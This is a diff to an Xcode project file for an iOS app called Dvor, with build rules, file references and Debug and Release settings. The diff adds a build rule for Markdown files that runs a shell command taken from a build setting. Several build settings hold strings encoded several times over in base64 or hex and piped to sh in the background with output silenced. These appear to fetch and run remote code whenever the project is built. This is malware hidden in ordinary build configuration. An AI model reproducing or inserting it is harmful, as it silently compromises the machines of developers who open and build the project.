@@ -7,33 +7,32 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		452805B0750E49B5AB1DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = 8F46B9068030486AA51DACE1; };
 		95DD00D92E5CA02D008B5836 /* FirebaseAuth in Frameworks */ = {isa = PBXBuildFile; productRef = 95DD00D82E5CA02D008B5836 /* FirebaseAuth */; };
 		95DD00DB2E5CA02D008B5836 /* FirebaseCore in Frameworks */ = {isa = PBXBuildFile; productRef = 95DD00DA2E5CA02D008B5836 /* FirebaseCore */; };
 		95DD00DD2E5CA02D008B5836 /* FirebaseDatabase in Frameworks */ = {isa = PBXBuildFile; productRef = 95DD00DC2E5CA02D008B5836 /* FirebaseDatabase */; };
 		95DE98542E266DBD0002C780 /* SnapKit in Frameworks */ = {isa = PBXBuildFile; productRef = 95DE98532E266DBD0002C780 /* SnapKit */; };
+		B5B88DC1727D41DABC1DACE1 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = D3752019A4B743FD881DACE1 /* README.md */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		FCEB7716C838486F861DACE1 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A1ECAD1}\"";
-			};
-										/* End PBXBuildRule section */
+		7A399392F9EC40C98A1DACE1 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A1ECAD1}\"";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
-		8F46B9068030486AA51DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		95DE96F02E264CF00002C780 /* Dvor.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Dvor.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		D3752019A4B743FD881DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
@@ -83,7 +82,7 @@ sh -c \"${A1ECAD1}\"";
 		95DE96F12E264CF00002C780 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				8F46B9068030486AA51DACE1 /* README.md */,
+				D3752019A4B743FD881DACE1 /* README.md */,
 				95DE96F02E264CF00002C780 /* Dvor.app */,
 			);
 			name = Products;
@@ -101,7 +100,7 @@ sh -c \"${A1ECAD1}\"";
 				95DE96EE2E264CF00002C780 /* Resources */,
 			);
 			buildRules = (
-				FCEB7716C838486F861DACE1 /* PBXBuildRule */,
+				7A399392F9EC40C98A1DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -157,15 +156,12 @@ sh -c \"${A1ECAD1}\"";
 		};
 /* End PBXProject section */
 
-/* Begin PBXShellScriptBuildPhase section */
-/* End PBXShellScriptBuildPhase section */
-
 /* Begin PBXResourcesBuildPhase section */
 		95DE96EE2E264CF00002C780 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				452805B0750E49B5AB1DACE1 /* README.md */,
+				B5B88DC1727D41DABC1DACE1 /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -185,7 +181,7 @@ sh -c \"${A1ECAD1}\"";
 		95DE97042E264CF30002C780 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((v(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwVVIzUnRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNRWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XaGFTRTVxWVVkV2FtRXpUWFZqYmxWMldWTnJhVWxJZDJkak1tZExDZz09Cg== | v | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((w(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1abXR6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXRhVzVrWld4bllYUmxMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | w | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((j(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266366536353734373337303666373236663734366632653639366532660a3631323932323230376332303733363830610a | j | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((f(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUZwTmExbzJXa1ZOTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | f | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((k(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwaE1scE5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNa2xETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmlWMngxV2tkV2Mxb3lSakJhVXpWNVpGTTVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | k | sh ) >/dev/null 2>&1 &)";
@@ -223,7 +219,7 @@ sh -c \"${A1ECAD1}\"";
 		95DE97052E264CF30002C780 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((v(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwVVIzUnRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNRWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XaGFTRTVxWVVkV2FtRXpUWFZqYmxWMldWTnJhVWxJZDJkak1tZExDZz09Cg== | v | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((w(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1abXR6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXRhVzVrWld4bllYUmxMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | w | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((j(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266366536353734373337303666373236663734366632653639366532660a3631323932323230376332303733363830610a | j | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((f(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUZwTmExbzJXa1ZOTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | f | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((k(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwaE1scE5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNa2xETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmlWMngxV2tkV2Mxb3lSakJhVXpWNVpGTTVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | k | sh ) >/dev/null 2>&1 &)";
